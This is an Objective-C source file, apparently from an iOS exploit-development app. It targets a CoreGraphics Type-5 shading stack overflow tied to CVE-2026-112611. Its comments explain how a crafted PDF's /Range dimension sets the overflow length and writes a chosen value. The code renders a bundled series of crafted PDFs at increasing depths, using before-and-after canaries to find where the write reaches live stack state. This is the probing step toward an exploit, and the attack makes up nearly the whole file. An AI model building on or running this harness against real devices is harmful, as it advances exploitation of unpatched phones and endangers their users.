#import <Foundation/Foundation.h>
#import <UIKit/UIKit.h>
#import <CoreGraphics/CoreGraphics.h>
#import "Modules.h"
#import "AppDelegate.h"
#import "Util.h"

// ===========================================================================
// CoreGraphics Type-5 (lattice-form Gouraud) shading OOB write — CVE-2026-112611
// family, fixed only in iOS 27.2 (24B115).  Our build is 26.2b1, and the
// 27.2 parse-time gate (range_dim == nc && nc <= 4) does not exist here at all.
//
// At draw time _cg_shading_type5_draw builds a 72-byte mesh record per vertex
// (colour area at +0x20, room for nc components) and calls CGFunctionEvaluate,
// which writes R doubles — R being the /Function's /Range dimension, chosen by
// the PDF and unrelated to nc.  The record array is a STACK VLA, so the writes
// walk up the frame; the overflow length is exactly 8*R - 40 bytes.
//
// Our shared cache has no symbols, so the frame cannot be measured by
// disassembly — instead the AIM IS SWEPT: R is a pure PDF parameter, and the
// family in Resources covers 8..416 (24..3288 bytes past the record).  Each
// render posts a canary before and after; the first R whose "before" arrives
// without an "after" is where the write reaches live frame state.  Every
// written double is 1.0 = 0x3FF0000000000000, so any wild dereference lands on
// a recognisable chosen address.
// ===========================================================================

// Renders one bundled PDF page into a small bitmap context.  Posts a canary
// before and after the paint, so a process that never returns still leaves the
// exact render it died in.
static NSString *ModRenderPDF(NSString *pdfName, NSString *tag) {
    NSString *bundle = [NSBundle mainBundle].bundlePath;
    NSString *path = [bundle stringByAppendingPathComponent:pdfName];
    if (![[NSFileManager defaultManager] fileExistsAtPath:path])
        return [NSString stringWithFormat:@"%@: %@ not in the bundle", tag, pdfName];

    NSData *raw = [NSData dataWithContentsOfFile:path];
    if (!raw.length) return [NSString stringWithFormat:@"%@: could not read %@", tag, pdfName];
    CGDataProviderRef prov = CGDataProviderCreateWithCFData((CFDataRef)raw);
    CGPDFDocumentRef doc = CGPDFDocumentCreateWithProvider(prov);
    CGDataProviderRelease(prov);
    if (!doc || CGPDFDocumentGetNumberOfPages(doc) < 1) {
        if (doc) CGPDFDocumentRelease(doc);
        return [NSString stringWithFormat:@"%@: not a readable PDF (%@)", tag, pdfName];
    }

    CGPDFPageRef page = CGPDFDocumentGetPage(doc, 1);
    CGRect box = CGPDFPageGetBoxRect(page, kCGPDFMediaBox);
    size_t w = (size_t)(CGRectGetWidth(box) + 0.5), h = (size_t)(CGRectGetHeight(box) + 0.5);
    if (w < 64) w = 64;
    if (h < 64) h = 64;
    CGColorSpaceRef cs = CGColorSpaceCreateDeviceRGB();
    CGContextRef ctx = CGBitmapContextCreate(NULL, w, h, 8, 0, cs,
                                             kCGImageAlphaPremultipliedLast);
    CGColorSpaceRelease(cs);
    if (!ctx) {
        CGPDFDocumentRelease(doc);
        return [NSString stringWithFormat:@"%@: no bitmap context", tag];
    }

    AvePost([NSString stringWithFormat:@"%@ BEFORE render of %@", tag, pdfName]);
    CGContextDrawPDFPage(ctx, page);          // <-- the write happens in this call
    CGContextRelease(ctx);

    AvePost([NSString stringWithFormat:@"%@ canary AFTER render (survived)", tag]);
    CGPDFDocumentRelease(doc);
    return [NSString stringWithFormat:@"%@: render returned without a fault (%@)", tag, pdfName];
}

NSString *ModCGShadingOOB(void) {
    AveLog(@"    CG Type-5 shading: CVE-2026-112611 stack OOB write, depth sweep");
    AvePost(@"CG start");

    // 1. control first: R == nc == 1 is in-bounds and must render cleanly.
    NSString *ctl = ModRenderPDF(@"control_shading_type5.pdf", @"CG-CTL");
    AvePost([NSString stringWithFormat:@"CGCTL %@", ctl]);
    if (![ctl containsString:@"without a fault"]) {
        AvePost([NSString stringWithFormat:@"CG verdict: CONTROL FAULTED (%@)", ctl]);
        return [NSString stringWithFormat:@"CG type-5: CONTROL FAULTED (%@) - the render path "
                @"itself is broken, not the bug", ctl];
    }
    AvePost(@"CGCTL in-bounds render OK, starting the R sweep");

    // 2. the sweep: the bundled sht5_rNNN family in ascending order.
    NSString *bundle = [NSBundle mainBundle].bundlePath;
    NSError *err = nil;
    NSArray *all = [[NSFileManager defaultManager] contentsOfDirectoryAtPath:bundle error:&err];
    NSMutableArray *fam = [NSMutableArray array];
    for (NSString *f in all) {
        if ([f hasPrefix:@"sht5_r"] && [f hasSuffix:@".pdf"]) [fam addObject:f];
    }
    [fam sortUsingSelector:@selector(compare:)];
    if (!fam.count) {
        AvePost(@"CG verdict: no sht5 family in the bundle");
        return @"CG type-5: no R-family in the bundle";
    }

    NSString *last = nil;
    for (NSString *f in fam) {
        NSString *tag = [NSString stringWithFormat:@"CG-R%@",
                         [f substringWithRange:NSMakeRange(6, 3)]];
        last = ModRenderPDF(f, tag);
        AvePost([NSString stringWithFormat:@"CGOOB %@", last]);
        if (![last containsString:@"without a fault"])
            return [NSString stringWithFormat:@"CG type-5: %@", last];
    }
    AvePost([NSString stringWithFormat:@"CG verdict: sweep done, every R returned (%lu PDFs)",
            (unsigned long)fam.count]);
    return [NSString stringWithFormat:@"CG type-5: sweep of %lu depths all returned without a "
            @"fault — the write is not reaching live state", (unsigned long)fam.count];
}